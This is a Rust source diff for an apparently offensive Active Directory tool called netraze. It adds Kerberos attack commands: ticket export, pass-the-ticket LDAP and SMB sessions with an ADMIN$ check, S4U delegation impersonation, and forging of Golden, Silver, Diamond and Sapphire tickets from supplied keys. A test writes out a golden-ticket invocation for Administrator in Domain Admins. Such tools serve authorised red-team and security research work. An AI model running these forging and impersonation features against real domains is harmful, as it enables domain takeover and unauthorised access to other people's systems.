@@ -1,11 +1,15 @@
 use anyhow::Result;
-use clap::{Args, Parser, Subcommand};
+use clap::{Args, Parser, Subcommand, ValueEnum};
 use netraze_app::NetRazeApp;
 use netraze_config::AppConfig;
 use netraze_core::ScanRequest;
 use netraze_protocols::kerberos::{
     KerberosAssessmentOutcome, KerberosAssessmentTargets, KerberosClient, KerberosClientConfig,
-    KerberosCredential, RoastArtifact, ServicePrincipalTarget, targets_from_inventory,
+    KerberosCredential, KerberosTicket, RoastArtifact, S4uDelegationMode, ServicePrincipalTarget,
+    TicketCache, TicketConstructionIdentity, TicketConstructionKey, TicketConstructionLifetime,
+    TicketConstructionOptions, TicketFileFormat, TicketSelector, export_ticket_file,
+    forge_diamond_ticket, forge_golden_ticket, forge_sapphire_ticket, forge_silver_ticket,
+    import_ticket_file, targets_from_inventory,
 };
 use netraze_protocols::ldap::{
     BloodHoundCeExportOptions, BloodHoundCeProgress, LdapAuthentication, LdapClientConfig,
@@ -113,7 +117,7 @@ enum Command {
 
 #[derive(Debug, Subcommand)]
 enum KerberosCommand {
-    /// Acquire and validate a TGT without saving it to disk.
+    /// Acquire and validate a TGT, with optional explicit ccache/kirbi export.
     Tgt {
         #[command(flatten)]
         target: KerberosTargetArgs,
@@ -121,6 +125,62 @@ enum KerberosCommand {
         username: String,
         #[command(flatten)]
         secret: KerberosSecretArgs,
+        /// Explicit ccache or kirbi destination. Nothing is saved by default.
+        #[arg(short, long)]
+        output: Option<PathBuf>,
+        #[arg(long, value_enum, default_value_t = TicketFormatArg::Ccache)]
+        format: TicketFormatArg,
+        #[arg(long)]
+        overwrite: bool,
+    },
+    /// Validate and display non-secret metadata from a ccache or kirbi file.
+    TicketInfo {
+        #[arg(long)]
+        ticket: PathBuf,
+    },
+    /// Authenticate an LDAP inventory session with an imported service ticket.
+    LdapSession {
+        #[arg(long)]
+        endpoint: String,
+        #[arg(long)]
+        service_host: String,
+        #[arg(long)]
+        ticket: PathBuf,
+    },
+    /// Authenticate an SMB session with an imported service ticket.
+    SmbSession {
+        #[arg(long)]
+        endpoint: String,
+        #[arg(long)]
+        service_host: String,
+        #[arg(long)]
+        ticket: PathBuf,
+    },
+    /// Exercise an already configured S4U2Self/S4U2Proxy delegation path.
+    S4u {
+        #[command(flatten)]
+        target: KerberosTargetArgs,
+        #[arg(long)]
+        ticket: PathBuf,
+        #[arg(long)]
+        own_service: String,
+        #[arg(long)]
+        impersonate: String,
+        #[arg(long)]
+        target_spn: String,
+        #[arg(long, value_enum, default_value_t = S4uModeArg::Constrained)]
+        mode: S4uModeArg,
+        #[arg(short, long)]
+        output: PathBuf,
+        #[arg(long, value_enum, default_value_t = TicketFormatArg::Ccache)]
+        format: TicketFormatArg,
+        #[arg(long)]
+        overwrite: bool,
+    },
+    /// Construct Golden, Silver, Diamond, or Sapphire tickets from explicit inputs.
+    Forge {
+        #[command(subcommand)]
+        command: KerberosForgeCommand,
     },
     /// Find users for whom the KDC returns an AS-REP without pre-authentication.
     AsrepRoast {
@@ -181,6 +241,154 @@ enum KerberosCommand {
         #[arg(short, long)]
         output: Option<PathBuf>,
     },
+}
+
+#[derive(Debug, Subcommand)]
+enum KerberosForgeCommand {
+    Golden {
+        #[command(flatten)]
+        identity: TicketIdentityArgs,
+        #[command(flatten)]
+        ticket: NewTicketArgs,
+        #[command(flatten)]
+        key: ConstructionKeyArgs,
+        #[command(flatten)]
+        output: TicketOutputArgs,
+    },
+    Silver {
+        #[command(flatten)]
+        identity: TicketIdentityArgs,
+        #[command(flatten)]
+        ticket: NewTicketArgs,
+        #[arg(long)]
+        service_principal: String,
+        #[arg(long, value_name = "ENV")]
+        service_key_env: String,
+        #[arg(long, value_name = "ENV")]
+        kdc_key_env: String,
+        #[arg(long, value_enum)]
+        enctype: ConstructionEtypeArg,
+        #[command(flatten)]
+        output: TicketOutputArgs,
+    },
+    Diamond {
+        #[arg(long)]
+        template: PathBuf,
+        #[command(flatten)]
+        identity: TicketIdentityArgs,
+        #[command(flatten)]
+        key: ConstructionKeyArgs,
+        #[command(flatten)]
+        output: TicketOutputArgs,
+    },
+    Sapphire {
+        #[command(flatten)]
+        target: KerberosTargetArgs,
+        #[arg(long)]
+        template: PathBuf,
+        #[arg(long)]
+        own_service: String,
+        #[arg(long)]
+        impersonate: String,
+        #[command(flatten)]
+        key: ConstructionKeyArgs,
+        #[command(flatten)]
+        output: TicketOutputArgs,
+    },
+}
+
+#[derive(Debug, Args)]
+struct TicketIdentityArgs {
+    #[arg(long)]
+    username: String,
+    #[arg(long)]
+    user_rid: u32,
+    #[arg(long, default_value_t = 513)]
+    primary_group_rid: u32,
+    #[arg(long, value_delimiter = ',')]
+    group_rids: Vec<u32>,
+    #[arg(long)]
+    domain_sid: String,
+    #[arg(long)]
+    logon_server: String,
+    #[arg(long)]
+    logon_domain: String,
+    #[arg(long = "extra-sid")]
+    extra_sids: Vec<String>,
+}
+
+#[derive(Debug, Args)]
+struct NewTicketArgs {
+    #[arg(long)]
+    realm: String,
+    #[arg(long)]
+    issued_at: i64,
+    #[arg(long)]
+    valid_from: i64,
+    #[arg(long)]
+    valid_until: i64,
+    #[arg(long)]
+    renewable_until: Option<i64>,
+    /// 32-bit ticket flags in hexadecimal, for example 40e10000.
+    #[arg(long)]
+    flags: String,
+    #[arg(long)]
+    kvno: Option<u32>,
+}
+
+#[derive(Debug, Args)]
+struct ConstructionKeyArgs {
+    #[arg(long, value_name = "ENV")]
+    key_env: String,
+    #[arg(long, value_enum)]
+    enctype: ConstructionEtypeArg,
+}
+
+#[derive(Debug, Args)]
+struct TicketOutputArgs {
+    #[arg(short, long)]
+    output: PathBuf,
+    #[arg(long, value_enum, default_value_t = TicketFormatArg::Ccache)]
+    format: TicketFormatArg,
+    #[arg(long)]
+    overwrite: bool,
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+enum ConstructionEtypeArg {
+    Rc4,
+    Aes128,
+    Aes256,
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+enum TicketFormatArg {
+    Ccache,
+    Kirbi,
+}
+
+impl From<TicketFormatArg> for TicketFileFormat {
+    fn from(value: TicketFormatArg) -> Self {
+        match value {
+            TicketFormatArg::Ccache => Self::CcacheV4,
+            TicketFormatArg::Kirbi => Self::Kirbi,
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+enum S4uModeArg {
+    Constrained,
+    ResourceBased,
+}
+
+impl From<S4uModeArg> for S4uDelegationMode {
+    fn from(value: S4uModeArg) -> Self {
+        match value {
+            S4uModeArg::Constrained => Self::Constrained,
+            S4uModeArg::ResourceBased => Self::ResourceBased,
+        }
+    }
 }
 
 #[derive(Debug, Args)]
@@ -382,6 +590,9 @@ async fn run_kerberos(command: KerberosCommand) -> Result<()> {
             target,
             username,
             secret,
+            output,
+            format,
+            overwrite,
         } => {
             let loaded = kerberos_credential_from_environment(&secret)?;
             let client = kerberos_client(target)?;
@@ -393,7 +604,122 @@ async fn run_kerberos(command: KerberosCommand) -> Result<()> {
                 tgt.session_encryption_type(),
                 tgt.valid_until_unix()
             );
+            if let Some(path) = output {
+                let cache = TicketCache::from_tgt(&tgt);
+                export_ticket_file(&path, &cache, format.into(), overwrite)?;
+                println!("[+] TGT exported to {}", path.display());
+            }
         }
+        KerberosCommand::TicketInfo { ticket } => {
+            let cache = import_ticket_file(&ticket)?;
+            println!(
+                "[*] {}@{}: {} ticket(s)",
+                cache.primary_principal(),
+                cache.primary_realm(),
+                cache.metadata().len()
+            );
+            for metadata in cache.metadata() {
+                println!(
+                    "[+] {:?} {} for {}@{} using {} ({}..{})",
+                    metadata.kind,
+                    metadata.service_principal,
+                    metadata.client_principal,
+                    metadata.client_realm,
+                    metadata.encryption_type,
+                    metadata.valid_from_unix,
+                    metadata.valid_until_unix
+                );
+            }
+        }
+        KerberosCommand::LdapSession {
+            endpoint,
+            service_host,
+            ticket,
+        } => {
+            let cache = import_ticket_file(&ticket)?;
+            let selector = TicketSelector {
+                service_principal: Some(format!("ldap/{service_host}")),
+                ..TicketSelector::default()
+            };
+            let service_ticket = cache.select(&selector)?.to_service_ticket()?;
+            let inventory = netraze_protocols::ldap::inventory_with_authentication(
+                LdapClientConfig::new(&endpoint),
+                LdapAuthentication::Kerberos {
+                    service_host,
+                    ticket: Box::new(service_ticket),
+                },
+            )
+            .await?;
+            println!(
+                "[+] LDAP Kerberos session collected {} users, {} groups, and {} computers",
+                inventory.users.items.len(),
+                inventory.groups.items.len(),
+                inventory.computers.items.len()
+            );
+        }
+        KerberosCommand::SmbSession {
+            endpoint,
+            service_host,
+            ticket,
+        } => {
+            let cache = import_ticket_file(&ticket)?;
+            let selector = TicketSelector {
+                service_principal: Some(format!("cifs/{service_host}")),
+                ..TicketSelector::default()
+            };
+            let service_ticket = cache.select(&selector)?.to_service_ticket()?;
+            let mut client = netraze_protocols::smb::SmbClient::new(&endpoint)
+                .with_kerberos(&service_host, service_ticket);
+            client.connect().await.map_err(anyhow::Error::msg)?;
+            let admin = client.check_admin().await;
+            client.disconnect().await;
+            println!(
+                "[+] SMB Kerberos session established for cifs/{service_host} (ADMIN$: {})",
+                if admin {
+                    "accessible"
+                } else {
+                    "not accessible"
+                }
+            );
+        }
+        KerberosCommand::S4u {
+            target,
+            ticket,
+            own_service,
+            impersonate,
+            target_spn,
+            mode,
+            output,
+            format,
+            overwrite,
+        } => {
+            let cache = import_ticket_file(&ticket)?;
+            let tgt = cache
+                .select(&TicketSelector {
+                    realm: Some(target.realm.clone()),
+                    ..TicketSelector::default()
+                })?
+                .to_tgt()?;
+            let client = kerberos_client(target)?;
+            let service = client
+                .request_delegated_service_ticket(
+                    &tgt,
+                    &own_service,
+                    &impersonate,
+                    &target_spn,
+                    mode.into(),
+                )
+                .await?;
+            let output_cache = TicketCache::new(KerberosTicket::from_service(&service));
+            export_ticket_file(&output, &output_cache, format.into(), overwrite)?;
+            println!(
+                "[+] Delegated {} ticket for {} exported to {}",
+                service.service_principal_name(),
+                service.client_principal(),
+                output.display()
+            );
+        }
+        KerberosCommand::Forge { command } => run_kerberos_forge(command).await?,
         KerberosCommand::AsrepRoast {
             target,
             mut users,
@@ -512,6 +838,157 @@ async fn run_kerberos(command: KerberosCommand) -> Result<()> {
             }
         }
     }
+    Ok(())
+}
+
+async fn run_kerberos_forge(command: KerberosForgeCommand) -> Result<()> {
+    match command {
+        KerberosForgeCommand::Golden {
+            identity,
+            ticket,
+            key,
+            output,
+        } => {
+            let identity = construction_identity(identity);
+            let options = construction_options(ticket)?;
+            let key = construction_key_from_environment(&key.key_env, key.enctype)?;
+            let forged = forge_golden_ticket(&identity, &options, &key)?;
+            export_constructed_tgt(&output, &forged)?;
+        }
+        KerberosForgeCommand::Silver {
+            identity,
+            ticket,
+            service_principal,
+            service_key_env,
+            kdc_key_env,
+            enctype,
+            output,
+        } => {
+            let identity = construction_identity(identity);
+            let options = construction_options(ticket)?;
+            let service_key = construction_key_from_environment(&service_key_env, enctype)?;
+            let kdc_key = construction_key_from_environment(&kdc_key_env, enctype)?;
+            let forged = forge_silver_ticket(
+                &identity,
+                &options,
+                &service_principal,
+                &service_key,
+                &kdc_key,
+            )?;
+            let cache = TicketCache::new(KerberosTicket::from_service(&forged));
+            export_ticket_file(
+                &output.output,
+                &cache,
+                output.format.into(),
+                output.overwrite,
+            )?;
+            println!(
+                "[+] Silver ticket for {} exported to {}",
+                forged.service_principal_name(),
+                output.output.display()
+            );
+        }
+        KerberosForgeCommand::Diamond {
+            template,
+            identity,
+            key,
+            output,
+        } => {
+            let cache = import_ticket_file(&template)?;
+            let template = cache.select(&TicketSelector::default())?.to_tgt()?;
+            let key = construction_key_from_environment(&key.key_env, key.enctype)?;
+            let forged = forge_diamond_ticket(&template, &construction_identity(identity), &key)?;
+            export_constructed_tgt(&output, &forged)?;
+        }
+        KerberosForgeCommand::Sapphire {
+            target,
+            template,
+            own_service,
+            impersonate,
+            key,
+            output,
+        } => {
+            let cache = import_ticket_file(&template)?;
+            let template = cache
+                .select(&TicketSelector {
+                    realm: Some(target.realm.clone()),
+                    ..TicketSelector::default()
+                })?
+                .to_tgt()?;
+            let client = kerberos_client(target)?;
+            let evidence = client
+                .request_sapphire_pac(&template, &own_service, &impersonate)
+                .await?;
+            let key = construction_key_from_environment(&key.key_env, key.enctype)?;
+            let forged = forge_sapphire_ticket(&template, &evidence, &key)?;
+            export_constructed_tgt(&output, &forged)?;
+        }
+    }
+    Ok(())
+}
+
+fn construction_identity(args: TicketIdentityArgs) -> TicketConstructionIdentity {
+    TicketConstructionIdentity {
+        username: args.username,
+        user_rid: args.user_rid,
+        primary_group_rid: args.primary_group_rid,
+        group_rids: args.group_rids,
+        domain_sid: args.domain_sid,
+        logon_server: args.logon_server,
+        logon_domain: args.logon_domain,
+        extra_sids: args.extra_sids,
+    }
+}
+
+fn construction_options(args: NewTicketArgs) -> Result<TicketConstructionOptions> {
+    let flags = args.flags.strip_prefix("0x").unwrap_or(&args.flags);
+    if flags.is_empty() || flags.len() > 8 || !flags.bytes().all(|byte| byte.is_ascii_hexdigit()) {
+        return Err(anyhow::anyhow!(
+            "--flags must contain one to eight hexadecimal digits"
+        ));
+    }
+    Ok(TicketConstructionOptions {
+        realm: args.realm,
+        lifetime: TicketConstructionLifetime {
+            issued_at_unix: args.issued_at,
+            valid_from_unix: args.valid_from,
+            valid_until_unix: args.valid_until,
+            renewable_until_unix: args.renewable_until,
+            ticket_flags: u32::from_str_radix(flags, 16)?,
+        },
+        kvno: args.kvno,
+    })
+}
+
+fn construction_key_from_environment(
+    name: &str,
+    encryption_type: ConstructionEtypeArg,
+) -> Result<TicketConstructionKey> {
+    let value = required_secret_environment(name)?;
+    match encryption_type {
+        ConstructionEtypeArg::Rc4 => TicketConstructionKey::from_rc4_hex(&value),
+        ConstructionEtypeArg::Aes128 => TicketConstructionKey::from_aes128_hex(&value),
+        ConstructionEtypeArg::Aes256 => TicketConstructionKey::from_aes256_hex(&value),
+    }
+    .map_err(anyhow::Error::from)
+}
+
+fn export_constructed_tgt(
+    output: &TicketOutputArgs,
+    ticket: &netraze_protocols::kerberos::TicketGrantingTicket,
+) -> Result<()> {
+    export_ticket_file(
+        &output.output,
+        &TicketCache::from_tgt(ticket),
+        output.format.into(),
+        output.overwrite,
+    )?;
+    println!(
+        "[+] Ticket for {}@{} exported to {}",
+        ticket.client_principal(),
+        ticket.realm(),
+        output.output.display()
+    );
     Ok(())
 }
 
@@ -824,6 +1301,105 @@ mod tests {
                 "NETRAZE_KRB_PASSWORD",
                 "--spn",
                 "svc-web=HTTP/web.example.test",
+            ])
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn kerberos_cli_accepts_ticket_sessions_delegation_and_construction() {
+        assert!(
+            Cli::try_parse_from([
+                "netraze",
+                "kerberos",
+                "ticket-info",
+                "--ticket",
+                "alice.ccache",
+            ])
+            .is_ok()
+        );
+        for (command, service_host) in [
+            ("ldap-session", "dc.example.test"),
+            ("smb-session", "files.example.test"),
+        ] {
+            assert!(
+                Cli::try_parse_from([
+                    "netraze",
+                    "kerberos",
+                    command,
+                    "--endpoint",
+                    "127.0.0.1",
+                    "--service-host",
+                    service_host,
+                    "--ticket",
+                    "service.kirbi",
+                ])
+                .is_ok()
+            );
+        }
+        assert!(
+            Cli::try_parse_from([
+                "netraze",
+                "kerberos",
+                "s4u",
+                "--kdc",
+                "dc.example.test",
+                "--realm",
+                "EXAMPLE.TEST",
+                "--ticket",
+                "service.ccache",
+                "--own-service",
+                "HTTP/web.example.test",
+                "--impersonate",
+                "alice",
+                "--target-spn",
+                "cifs/files.example.test",
+                "--output",
+                "delegated.ccache",
+            ])
+            .is_ok()
+        );
+
+        assert!(
+            Cli::try_parse_from([
+                "netraze",
+                "kerberos",
+                "forge",
+                "golden",
+                "--username",
+                "Administrator",
+                "--user-rid",
+                "500",
+                "--primary-group-rid",
+                "513",
+                "--group-rids",
+                "512",
+                "--domain-sid",
+                "S-1-5-21-1-2-3",
+                "--logon-server",
+                "DC01",
+                "--logon-domain",
+                "EXAMPLE",
+                "--realm",
+                "EXAMPLE.TEST",
+                "--issued-at",
+                "1700000000",
+                "--valid-from",
+                "1700000000",
+                "--valid-until",
+                "1700003600",
+                "--renewable-until",
+                "1700007200",
+                "--flags",
+                "0x40e10000",
+                "--kvno",
+                "2",
+                "--key-env",
+                "NETRAZE_KRBTGT_KEY",
+                "--enctype",
+                "aes256",
+                "--output",
+                "golden.ccache",
             ])
             .is_ok()
         );
